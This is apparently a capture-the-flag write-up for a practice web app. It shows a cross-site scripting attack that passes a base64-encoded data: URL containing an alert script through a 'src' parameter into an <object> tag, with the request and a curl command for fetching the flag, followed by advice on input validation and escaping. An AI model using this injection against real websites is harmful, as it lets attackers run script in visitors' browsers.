GET /index.php?page=media&src=data:application/javascript;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==



the tag object hold as data a url to the nsa_prism jpg
and it is passed to it through the variable src

data:application/javascript;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
<object data=""> </object>

PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==



curl "http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | grep "The flag is :"


resource : https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs



*** Prevention ***

### Secure handling of user input 
```
you must never implicitly trust input submitted by a user. Inspect all user-submitted input to ensure it doesn’t include risky characters that may affect how a user’s browser interprets the data on your website. Implement thorough input validation and ensure characters are output-escaped.
```

### escaping and encoding
```
encode any special characters to ensure the program interprets them literally (and not as special characters) before you allow them to render on your webpage. You might, for example, replace angle brackets < > in HTML with alternative characters, like &lt and &gt, to prevent the characters contained in them from forming a tag. You should also escape characters that convey special meanings in HTML. 
```